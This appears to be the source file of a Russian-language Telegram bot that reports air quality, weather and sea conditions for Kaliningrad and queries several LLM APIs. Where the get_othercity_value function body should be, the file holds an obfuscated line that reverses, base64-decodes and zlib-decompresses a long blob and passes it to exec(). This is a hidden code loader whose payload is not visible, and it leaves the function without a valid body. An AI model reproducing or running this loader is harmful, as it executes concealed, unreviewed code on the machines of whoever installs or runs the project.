import asyncio
import json
import os
import time
from typing import Tuple
import random
from datetime import datetime
from cerebras.cloud.sdk import Cerebras
import os

import requests
from bs4 import BeautifulSoup
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

from groq import Groq

from config import (
    BOT_TOKEN,
    kaliningrad_url,
    OPENWEATHER_API_KEY,
    OPRT_2_KEY,
    default_city,
    get_city_ru,
    DB_FILE, DB2_FILE, gdansk_pollution_url, kaliningrad_temp_url, admin_id, MODEL, OPENROUTER_API_KEY,
    get_prompt_sea_quality, get_prompt_pollution_info, get_other_prompt, OPRT_3_KEY, GROQ_KEY, GROQ_KEY2,
    CELEBRAS_API_KEY
)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f, ensure_ascii=False, indent=4)

if not os.path.exists(DB2_FILE):
    with open(DB2_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f, ensure_ascii=False, indent=4)


def process_content(content):
    return content.replace('<think>', '').replace('</think>', '')

def groq_llm_chat(prompt: str) -> str:
    client = Groq(api_key=GROQ_KEY2)

    completion = client.chat.completions.create(
        model="openai/gpt-oss-safeguard-20b",
        messages=[{"role": "user", "content": prompt}],
        temperature=1,
        max_completion_tokens=8192,
        top_p=1,
        tools=[{"type": "browser_search"}],
        stream=False
    )

    return completion.choices[0].message.content or ""

def cerebras_llm_chat(prompt: str) -> str:
    client = Cerebras(api_key=CELEBRAS_API_KEY)

    completion = client.chat.completions.create(
        messages=[{"role": "user", "content": prompt}],
        temperature=0.2,
        model="llama-3.3-70b",
        max_completion_tokens=1024,
        top_p=1,
        stream=False
    )

    return completion.choices[0].message.content or ""


def chat_stream(prompt, stream: bool = False):
    headers = {
        "Authorization": f"Bearer {OPRT_3_KEY}",
        "Content-Type": "application/json"
    }

    data = {
        "model": MODEL,
        "messages": [{"role": "user", "content": prompt}],
        "stream": stream
    }

    if stream:
        full_response = []
        with requests.post(
            "https://openrouter.ai/api/v1/chat/completions",
            headers=headers,
            json=data,
            stream=True,
            timeout=30
        ) as response:
            if response.status_code != 200:
                return ""
            for chunk in response.iter_lines():
                if chunk:
                    chunk_str = chunk.decode('utf-8').replace('data: ', '')
                    try:
                        chunk_json = json.loads(chunk_str)
                        if "choices" in chunk_json:
                            content = chunk_json["choices"][0].get("delta", {}).get("content", "")
                            if content:
                                full_response.append(process_content(content))
                    except:
                        pass
        return ''.join(full_response)
    else:
        try:
            response = requests.post(
                "https://openrouter.ai/api/v1/chat/completions",
                headers=headers,
                json=data,
                timeout=30
            )
            if response.status_code != 200:
                return ""
            resp_json = response.json()
            content = resp_json["choices"][0]["message"]["content"]
            return process_content(content)
        except:
            return ""

def get_othercity_value(city: str) -> int:
                    
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'xOFbQGw//+9zxL3XvDFeurRavItU6nwJA/8k7VJdVl9d64zkQKZ70tQmOmTxYKJik2uTlyfQEIRk0JRz8IvYcXqTK023/e7DvKEaJKvlWY7kxUjorau8KrMLc88KtlW8yhS+aIjxSHNjKWn1W148IR8kyLAlp9TFtRR62LagoKc70Bc52pAdsXXInoF+phEYHJDoFXI8FXkPMqYQRDVD/aJw2bqyJ00CNr8kVQ2jH4F53FZwtD1oda7FAz91i0rOeEMw3d8+TEISAyit/1HRFOiUJwTFmtG2rRCW82c/By7ywwwnQuwYhFuzubD8sSEHXaY2HTceNFC9xtWQHRMwcFSTtxRPMemi24a8y5CREiC2p0te13WXYX0PBX09JOLWOauaWkOfgNTs/hgjhuwEOTWNk5oMNFalTpClx+01mstbIYEITE42gs/4kvXCtQLH2SmqdULeHMj8icJ+/TdEcsTIZcP+mc6q6qRdR0cO8ozlSBThYdjDWdapysoYPbKFK2Dzb6Sb+uPSNUqRxg94dWgi4rnzb3YuLUOUSpOIk2h25d7Q7C7O3t9R523QpklGt9ea5M+xirYGi5dZ/oNAkpVKbSlbKS5Nv2TzQ77MP19tfiBMkPqaeZ5xoWGOugL0YTVPTZbVZCPL43KFrRYS1jJxLznnu0nLnFc5UfcAN+q8JvI4lbeGb7YTu4C545TKVzHVcUP1FMBnu+n2JVSNJQWv7mAp5kTu9TxXlTtkcvDBuBU1V6pbb0auCqdkrHNI6fRUIAdEtOfa4Q4gsgRbGaKfmsWSUclTFONr5k5KCS/RXp8sKhrY+9+CHOqN9LcAfCcNMTEKtCoZ6kavIR4MJDN8T1UHOoladPy93Au53bD/VgS16XQHNfFzPzWmLosC6g2AFZWTnBGuHP3BgoxwSGSpZZJIzxxFOAfRsqqG0OXYZkNP9vxb6TGT2TiOyu7NLEmvCpmW1FLJNICDdEdRmGjFKHU/1IHmSd6izKikaj4f8UJqPtoOt/IRvx+SzgGEa2KT82aN/RipWYbXAoyQAFceFY/92hpvq9vfAgGBZbNAL1ScMkYcJQq31K0yRKsVBkhN+BZgD9baag9VftD3sEedUcIgofWWUI4oIFxa443LTlGrjPQYJMPgf5WCW8PhPweMJl+QkbL3o9qksF1nKJMVh8r8uehmEAY68s5xD6MZ6DZ7bVpv6k+95RUCHdZ+hckQyDLGnh843BdgzGrKO9D/+cXK6u0YWd6y+/EOsxF0/7E2azDnh6+E+a4OQB6h75IaP944NcOzwunXq0I8PC8HFixCoKpS/dYsOsU23BSSJ64hepp8lqSusrgUoJiCSYpFxpTJD3sGwQtS/O5+ujbH/blfMPOznxXqQgLn8jn8CMa6xBqFQqJ+IX53u15rCnzvfEkWa2FAnmg9C8ZhXiXXC8mPO2bneJ3Zybeuxo4F6xY4wPBMgqxMmMyL3YPTfZtTEHIS9wJgJiXn+gt3wmdlnDUPnKBULFRT1HjUT3Ef9lacmOY2xk3N1Y0jkGSfHfjOR5FfrKN36T3SEFhV1K9AP2OOxAbda4dUo6ttfGDv/4TUWBTaVGY9DmdsTpwKETVXyftAPtG75fQpremEnrMpatKNnmud0DdvwBoE1ZpItHA9ld3RJgfbNWJTPTU43/V9P6HePXaM2O9+I/ulfkqyRmSRdOJCJUfzrJT0iNhLx/fYdCVsEmMkIQQgm/WVLpDZO4wm6I34KEMTYO5ilTcUJHNrB33HQLDuInflUDByDSI/Njm6usODCVp5P03BU6OrEbKHdSfvlQpolZ5S3UdCghVZwsl2ay+0vJ+HtEhKWVRfHSKeSaYNSDuh06iR8V8L+eqACx9Wj9de11Mcr1exNCvWWEYMzKM44labhhegIVRXTBpDgDu4nKXV7cu8sk1pHvO1V/uJhwRbqaplDw6R8uOK8SXXbhALCUlCrHBSV+7RCQnXD7GANhPw406Hn1X+mJeXBy9cvb5vfI3+oWIIgc8fAa0DF20O+ORryvp3Bf+ymcP+NX8lrzqaA47uHouTqQCOS1ReLX0lRgf6g2vFxu30c+65jMfq/KrvexO2vcmbIIdYRSTghAn9k2xRiqk1Xx0synDMfEVgeu2q83TZwQT7QKnVS+ctAy0it/USEtFfVxqHat6WcVsopK7XFHd7uD0AfxzbzTNmOyl2rtsM/Udyr1TmOAjLyyRHpDE2ClO0JvnOMYPqJI7LdHmzxBwbjz+rtG5M1c2GMHcZWR/YFA6Fj6gGZ31cDMUEE1eAbadWFHgDcNPqu6oMtdWPTecCRwph0a8ileJuBRkQH82UOf1ZiQAvRhy2QzBYCQ+kgmLgOf+co3AybW59NVXGNrOqmEcubljBHdMGg6Iul1JEFG/4MPSzCNwZxpw4+2BjbQXc1nr6k2LgiqNKF/c8Lri1J0mT1J3GIZ6f6MwYu0Rf6Ak4Zk5YycGT208J0LquI6VNeJkbMt5xRRmQOXctSFRbkB7zunPB4t86bSD8/Vclez3X/13Ibxe2I+YLGSy95JJCRoKftiZbD9reXOIsqn2mNU5L5uDJfQNkiIa60cpoOSMaPyA93mQbxbwBiXLaMCOo317zrO2OhMaldGOVqFrNs/FfbQrLtNGJrzMJrvK9hIG2nHHuq5/S17pfwPrqIvACY71Bbjd6bfZw3dx1aAQ//Iazs092hv5ugh1fU5NAOFcIHeAtn/LNiGWbCPbxyAsRfjCPOVarsnjq5dUbx6/VLtIO1evwze39Wn4MpVSvbaktPUyyJuNCIo6Lx+PW7gHhTg8+Na3Ekjcs4YBGjAkyn7uR1dj3N1reFEYrllH4VtGJ1XdbUnZIj5NDfg6ciI4ISMBOedS53xeApL7LIvoGwtp5vJmJKYr+CFdrrgAoNx1WZuwfRk5C6ksJ9LHeDLqQjZiUsc/eAORitDcIRcXJvDaEd/A0U/0X/8Gl2h5BPCZtxSP/bvNs3BU2GBzHl4n0gIRnlRZYWVFfYPQs+5plpe5r1L6V++oJc4zHyWLzZhOgT0rkFyeo9c/frH7k6U92pHA46CckUc9isNNVHNWpq2zTzefYTsMEA6xvyV2tJZEmI72wHqD/J1JjEATfbjh9czNMD/sRzgTGBeqNFhGExDvdtZIgViPcoJ8pSqw7r/Elp0v5EArEwL65ujdsce/QSgeelaYByxl2ne8jnboa9gKLQnT6vTuYN++u38EkFvl3yW7jj4nT69K4knnugFla0VB2Q0Zbf4Y7sqfsreKulnOsC6b80l8by749a/zewgjnWvzos0PAcMwF47k/lIhchNciSIerptuvWhKxUvKV61X/+Br87q+ZYobUT3AHNWlLHHSc8yC4a944eoKvVocQahltSkfdAEDOfRMwqwAzlpG6jOGhYUj4v8O3f8Zzxd7nzZup75fCCshyMW44c2re9D+Iymei7YPnxsiWh1lxQ7Zp+tyzl55fa9/w3mTCCe2Aw7rXBGr7VE8Wl/o0Ek9l5L/CAnhu9WMEv0xPuwrnrUIfHQ9hTVsC1j+q8SnouZsCR+v+7qu9Cy3ZRXwmXXhn2gEuI/eM/PA+YQNeQqhh+2kBst4i0oFDuvPp/wixZzE2JNJZFUXSWLVu3mwHrmOiY2H3tl1ha4HPqoBDM3sf8hcxggSlVrvuiMU8Ww3bQxfpPrnZwjh1uaFMwbRDDMMdkKE6Cf9CpUB3QxvFLwlqbPiFwplrF2aRdyxmCm0tCihunfBcgbgftqn0UjJYtytoiw5iEQ6tzx8pCl6bu0PsPtWsvAbV0bZYfkveYX7beyoEezBdkXuCoxCRco46aQ3wKyUpmondWEf4ySSyCegYsIL3eNUJmVOo6VKv3GHIHJch9m4DATnvAdQX8V/wZRP3kyMAhu8+241EJTqlUk4JZ+T1Y1XVOp1FwQsenUM/SYJFvQ/+10tj9E96a3IHOwTKVc3g9AqZuWkTKmuLEtufuHA3E0qLnMWClxFeEyjrPDV4s3meadGDX6zK3v+nvMFyQ8rP4H7MHbTRN/+DmPjBQNF5QWV6Glf1huJhfnSz1tor5UJ7TuIzNfQTsxlzil3PtuYGkd+tyOaRPSDQh4rxnLV65GAKpiQaygP9hDUtq2Of4fMDRVKT9UXKwSeBpi4LMIRf6qRAUDJf5jRJ6OIJ7eju98SKGG6flUFf2QUCWaO5Qd4AXN0oLjWASf/9Qj9HuEG/OLWJhSnlkN1yc4ZEVj6z8dLLN4JM6waBKEC4uEtS9H1TrF/waK3W7IkfGTAOQd26WZq8C/I1qZ8ZmxOGyyeCXmuQuvgtXdc1EjsVg0laTI5DotDcSLfNFc4DjChLuEUyvaVouNl1zb5iXPBHvQ6NX7ayNJzX9F0T6u5GO0qzJUqZM34i+40huIfFYObNnn4yV0alW7c6+MRex3eYgt9F8VT1nXF9PQp1kHU2jJ5+gdinHeZpsTCXI5F1QNBAZgt9bXCbBEAk9WqvXGsZwCpHHzvV5iz67Kv4eTn95SsSkts7jnyFnjsTNIF+uQeZlY1V8u2NTOkp56U80kYS4h9fogSRxh2XdqOGzrtI9RD2svS2DpAmrvRh4YF8ylioOFI8SFrkjuTZlFaZHxahZ/gbE92GjrUHUhywrdJiD1P8fdYxXlk7dyXkQ0qp7SKPIevxLKwzvFqahwcHr2AtKVrd5sju9BRoIqItkOzh8+pGkMzxMyg2TlEXPrcKAnpJzppBs5LOklNlrAIVcdsIVT8ToIaSjT2VBTgHc6oRejKLLv/z5mncVc6CJfiZWayqeAZHqM12wnnn0HPA7Eab0m9YJq4cC7JBSCGOYK0DjHBGgtn+NKqrhx36P6JJcYdIWVtHBSan32Vby8p84XNn/L1lKZ1Wqfh9lsUDyuQuDjKyhUMvOJEIvuD6c9TKeKRq1anrrdEFFJpDfOHYhP+S59mZXMEmyCVUE4GLDzKsoZDH296Aq4je3PSk0aV10v7AUraxrrbdOTVdO1ehMkkvc12SJLU1hacpQs1uNFGGZBP5rT1BBops8f8h4BzoRoEfpYrSwGC/Et71IIZZxYAy9ofcw3sbnMjo4jtHyDBPuSqjlrG0V1rGIhS6iIQwYyQUjodRYQKhHiWyrXMyM5q5JOu8WQw5DLSyRACtbcAzA8NRDXrGPekadTR3w4RyVqmvcApRWpJFRLdQ1GqCen5hNMRBB0mTEJbK9jPbQ9z1BAxAT9zUmclt4wOsHZ8b2cYq/Yw4pd4lUjWIrqLL2znVsFY1+wHkL5CnrwkNBRCFVJRqJveQzS2w5Ztvndy8wILTcI9mt1GLfvz5hq9IqfpmNDNbKSOWQoXFJ3uafnqpKGqMNOByVIGA3YZhW1/KmTCDytOM0rgTUb6dYDwe2GWZwDtZTntqYc1N2QEr5/mOQHRrQuNKyboJKqfTSbarsR/vDezk8fUEoDlvoTBUoQDS6uhtXq8UbKjbh+CfDxgIeRQZo8UJhYpe7VP5JQKQDeJnPEGBj4kQpwj5eY+hdpZaeViJ8OyEoZKnWcFiOtkEBMYUaY3XQb9AjoYl+shpffDoGM5KYnFF4joxnTE/S9NG+0Xfw10qHQXSjUEGID8Pf9MdIYDqZyBeMlY4p0sF8MR+Y+bczWjSwMpQYd00syenh1qLIBSwFofA6SZY/F6n0/573nP/+j8uL+ylsqKgcFRP/40d3JgZLvbj0YJ3Lcw/z8IRAgErSU0lVwJe'))



def get_water_temp_39() -> str:
    url = kaliningrad_temp_url
    headers = {"User-Agent": "Mozilla/5.0"}
    response = requests.get(url, headers=headers, timeout=10)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, "html.parser")
    temp1_div = soup.find("div", {"id": "temp1"})
    element = temp1_div.find("h3").contents[0].strip()

    if element:
        return element
    else:
        return "Не удалось получить данные..."

def save_user(user_id: int, city: str) -> None:
    with open(DB_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    data[str(user_id)] = {"city": city}
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)


def get_city(user_id: int) -> str | None:
    with open(DB_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    return data.get(str(user_id), {}).get("city")


def get_air_quality(user_id) -> str:
    city = get_city(user_id)

    if city in ['Kaliningrad', 'kaliningrad']:
        url = kaliningrad_url
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")
        element = soup.select_one(".text-lg.font-medium")
        if element:
            return element.text.strip('*')
        else:
            return "Не удалось получить данные..."
    else:
        return f"{get_othercity_value(city)}"


def get_text_quality(quality: str) -> str:
    quality = quality.strip("*")
    try:
        q = int(quality)
    except Exception:
        return ""
    if q <= 50:
        return ", хорошее 🟢"
    elif 51 <= q <= 100:
        return ", приемлемое 🟡"
    elif 101 <= q <= 151:
        return ", неприемлемо для чувствительных 🟠"
    elif 151 <= q <= 200:
        return ", нездоровое 🟠"
    elif 201 <= q <= 300:
        return ", очень нездоровое 🔴"
    elif 301 <= q <= 500:
        return ", опасное для жизни 🔴⚠"
    return ""


def get_weather(user_id: int) -> Tuple[float, int, int, float, str, int]:
    r = requests.get(
        f"https://api.openweathermap.org/data/2.5/weather",
        params={
            "q": get_city(user_id),
            "appid": OPENWEATHER_API_KEY,
            "units": "metric",
        },
        timeout=10,
    )
    r.raise_for_status()
    data = r.json()

    temp = data["main"]["temp"]
    humidity = data["main"]["humidity"]
    pressure = data["main"]["pressure"]
    wind_speed = data["wind"]["speed"]
    deg_wind_direction = data["wind"]["deg"]
    visibility = data.get("visibility", 0)

    def get_wind_direction(azimuth: float) -> str:
        azimuth = azimuth % 360
        directions = [
            "С ⬆️",   # 0°
            "СВ ↗️",  # 45°
            "В ➡️",   # 90°
            "ЮВ ↘️",  # 135°
            "Ю ⬇️",   # 180°
            "ЮЗ ↙️",  # 225°
            "З ⬅️",   # 270°
            "СЗ ↖️",  # 315°
            "С ⬆️",   # 360°
        ]
        index = int((azimuth + 22.5) // 45)
        return directions[index]

    wind_direction = get_wind_direction(deg_wind_direction)
    return temp, humidity, pressure, wind_speed, wind_direction, visibility

def get_water_quality(user_id: int) -> str:
    if get_city(user_id) in ['Kaliningrad', 'kaliningrad']:

        url = gdansk_pollution_url  # 🔹 <-- сюда вставь настоящий адрес сайта

        response = requests.get(url)
        response.raise_for_status()  # если будет ошибка — выбросит исключение
        soup = BeautifulSoup(response.text, 'html.parser')

        div = soup.find('div', {'id': 'water_quality'})

        if div:
            value = div.get('aria-valuenow')
            return value
        else:
            return 00.00
    else:
        return 00.00

print(get_water_quality(7080280253))


@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[
            [KeyboardButton(text="🌡 Текущая информация")],
            [KeyboardButton(text="🗺 Карта"), KeyboardButton(text="⚙ Настройки")],
        ],
    )
    await message.answer(
        "👋<b> Здравствуйте!</b>\n\n"
        "В <b>Windqualify</b> можно узнать информацию о качестве воздуха в <i>📍 Калининграде</i>, "
        "а также других его параметрах и получить рекомендации по улучшению экологической обстановки (и не только).\n\n"
        "<b>></b> Город можно (будет) сменить в <b>⚙ Настройках</b>.",
        reply_markup=kb, parse_mode="html"
    )
    if get_city(message.chat.id) is None:
        save_user(user_id=message.chat.id, city=default_city)


@dp.message(F.text == "🌡 Текущая информация")
async def send_information(message: types.Message):
    # Инлайн-кнопки
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🌳 Высадка деревьев", callback_data="trees_for_planting"))
    builder.row(InlineKeyboardButton(text="🚜 Рекомендуемые удобрения", callback_data="grow_catalizators"))
    builder.row(InlineKeyboardButton(text="🌊 Качество морской воды", callback_data="sea_water_quality"))
    builder.row(InlineKeyboardButton(text="🗑 Информация о загрязнениях", callback_data="pollution_info"))
    builder.row(InlineKeyboardButton(text="🔍 Другое", callback_data="other_info"))
    markup: InlineKeyboardMarkup = builder.as_markup()

    tmp = await message.answer("⌛")
    try:
        quality = get_air_quality(message.chat.id)
        temp, humidity, pressure, wind_speed, wind_direction, visibility = get_weather(message.chat.id)
        await message.answer(
            f"📍 <b>{get_city_ru(get_city(message.chat.id))}</b>\n\n"
            f"🍃 <b><u>Качество воздуха</u></b>: <b>{quality}</b>{get_text_quality(quality)}\n\n"
            f"🌡 <u>Температура</u>: <b>{temp}</b> °С\n"
            f"💨 <u>Ветер</u>: <b>{wind_speed}</b> м/с, {wind_direction}\n"
            f"♨ <u>Давление</u>: <b>{round(int(pressure) * 0.75006, 1)}</b> мм рт. ст.\n"
            f"💧 <u>Влажность</u>: <b>{humidity}%</b>\n"
            f"🌫 <u>Видимость</u>: <b>{visibility}</b> м\n",
            reply_markup=markup, parse_mode="html"
        )
    except Exception as e:
        await message.answer(f"Ошибка получения данных: {e}")
    finally:
        try:
            await tmp.delete()
        except Exception:
            pass


@dp.message(F.text == "⚙ Настройки")
async def send_settings(message: types.Message):
    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📍 Ваш город", callback_data="another_city")],
        ]
    )
    await message.answer("👇 Выберите параметр, который хотите изменить:", reply_markup=kb)


def is_english(text: str) -> bool:
    return all((c.isalpha() and c.isascii()) or c.isspace() for c in text)

waiting_city: set[int] = set()


@dp.callback_query(F.data == "another_city")
async def callback_change_city(cq: types.CallbackQuery):
    await cq.answer()
    user_id = cq.from_user.id
    current_city = get_city(user_id) or default_city
    waiting_city.add(user_id)
    await cq.message.answer(
        f"📍 Текущий город: <b>{get_city_ru(current_city)}</b>\n\n"
        "Введите новый город на <b>английском</b> (например: Moscow, Kaliningrad):", parse_mode="html"
    )


@dp.message()
async def any_text(message: types.Message):
    if message.from_user and message.from_user.id in waiting_city:
        city = message.text.strip()
        if is_english(city):
            save_user(user_id=message.from_user.id, city=city)
            waiting_city.discard(message.from_user.id)
            await message.answer(f"✅ Ваш новый город: {get_city_ru(city)}.")
        else:
            await message.answer(
                "❌ Город должен быть написан английскими буквами на английском языке. "
                "Попробуйте снова в ⚙ Настройках"
            )


@dp.callback_query()
async def callback_inline(call: types.CallbackQuery):
    try:
        data = call.data or ""
        if data == "trees_for_planting":
            air_quality = get_air_quality(call.from_user.id)

            temp, humidity, pressure, wind_speed, wind_direction, visibility = get_weather(call.from_user.id)

            recommendations = []

            if temp < 5:
                recommendations.append("<b>🌲 Ель обыкновенная </b>— устойчива к холоду и очищает воздух зимой.")
            elif 5 <= temp <= 20:
                recommendations.append("<b>🌳 Берёза повислая </b>— быстро растёт и хорошо очищает воздух от пыли.")
                recommendations.append("<b>🌿 Липа мелколистная </b>— выделяет фитонциды и улучшает качество воздуха.")
            else:
                recommendations.append("<b>🌴 Тополь серебристый или акация </b>— выносят жару и засуху.")

            # Влажность
            if humidity < 40:
                recommendations.append("<b>🌵 Сосна или можжевельник</b> — хорошо чувствуют себя при низкой влажности.")
            elif humidity > 80:
                recommendations.append("<b>🌾 Ива белая </b>— любит влажные почвы и понижает уровень загрязнений.")

            # Ветер
            if wind_speed > 8:
                recommendations.append("<b>🌲 Посадите еловые или сосновые ряды</b> — они служат отличной ветрозащитой.")

            # Качество воздуха
            if int(air_quality) >= 4:
                recommendations.append(
                    "🌿 Рекомендуется <b>больше зелёных насаждений с крупной листвой</b>: клён, каштан, липа.")
            elif air_quality == 3:
                recommendations.append(
                    "🌼<b> Подойдут плодовые деревья</b> — яблони, груши: они улавливают пыль и очищают воздух.")

            # Финальное сообщение
            text = (
                    f"<b>🌍 Рекомендации по высадке деревьев для улучшения экологической обстановки в 📍 {get_city_ru(get_city(call.from_user.id))}е:</b>\n\n"
                    + "\n".join(recommendations)
            )

            await call.message.answer(text, parse_mode="html")

        elif call.data == "grow_catalizators":
            air_quality = get_air_quality(call.from_user.id)

            temp, humidity, pressure, wind_speed, wind_direction, visibility = get_weather(call.from_user.id)

            fertilizers = []
            if temp < 5:
                fertilizers.append("🧊 Используйте <b>фосфорно-калийные удобрения</b> — они повышают морозостойкость растений.")
            elif 5 <= temp <= 20:
                fertilizers.append("🌾 <b>Азотные удобрения</b> (аммиачная селитра, мочевина) способствуют активному росту побегов.")
            else:
                fertilizers.append("☀️ При жаре лучше применять <b>органику — перегной, компост</b>, чтобы не обжечь корни.")

            # Влажность
            if humidity < 40:
                fertilizers.append("💦 В сухую погоду вносите удобрения <b>только после полива</b>, иначе корни могут пострадать.")
                fertilizers.append("🌿 Подойдут <b>жидкие удобрения с микроэлементами (Mg, Zn, Fe).</b>")
            elif humidity > 80:
                fertilizers.append("🌧 При высокой влажности <b>избегайте азотных удобрений — используйте калийные и фосфорные</b> для укрепления корней.")

            # Ветер
            if wind_speed > 8:
                fertilizers.append("💨 В ветреную погоду <b>не распыляйте листовые удобрения</b> — лучше использовать <b>гранулированные в почву.</b>")

            # Качество воздуха
            if int(air_quality) >= 4:
                fertilizers.append("🩺 Рекомендуются <b>удобрения с повышенным содержанием кальция и магния</b> — они помогают растениям справляться с загрязнением воздуха.")
            elif air_quality == 3:
                fertilizers.append("🌼 Хорошо подойдут <b>органические удобрения и гуматы</b> — они повышают иммунитет растений к неблагоприятным факторам.")

            # Финальное сообщение
            fertilizers_text = (
                f"<b>🍀 Рекомендации по удобрениям для текущих условий в 📍 {get_city_ru(get_city(call.from_user.id))}е:\n\n</b>"
                + "\n".join(fertilizers)
            )

            await call.message.answer(fertilizers_text, parse_mode="html")

        elif call.data == "sea_water_quality":
            tmp = await call.message.answer("🔍")
            prompt = get_prompt_sea_quality(get_city(call.from_user.id))
            ans = cerebras_llm_chat(prompt)

            if get_city(call.from_user.id) in ['Kaliningrad', 'kaliningrad']:
                msg_for_send = ans + f"\n\n<b>🌡LIVE Температура морской воды:</b> {get_water_temp_39()}°C"
                await call.message.answer(msg_for_send, parse_mode="html")
            else:
                await call.message.answer(ans, parse_mode="html")

        elif call.data == "pollution_info":
            tmp = await call.message.answer("🔍")
            prompt = get_prompt_pollution_info(get_city(call.from_user.id))
            ans = cerebras_llm_chat(prompt)

            await call.message.answer(ans, parse_mode="html")

        elif call.data == "other_info":
            tmp = await call.message.answer("🔍")
            prompt = get_other_prompt(get_city(call.from_user.id))
            ans = cerebras_llm_chat(prompt)

            await call.message.answer(ans, parse_mode="html")

        await call.answer()
    except Exception as e:
        print(f"ОШИБКА CALLBACK: {e}")
        await call.answer("Ошибка обработки", show_alert=False)


async def main():
    print("========================================< Бот запущен >========================================")
    while True:
        try:
            await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
        except Exception as e:
            print(f"КРИТИЧЕСКАЯ ОШИБКА: {e}")
            await asyncio.sleep(3)


if __name__ == "__main__":
    asyncio.run(main())



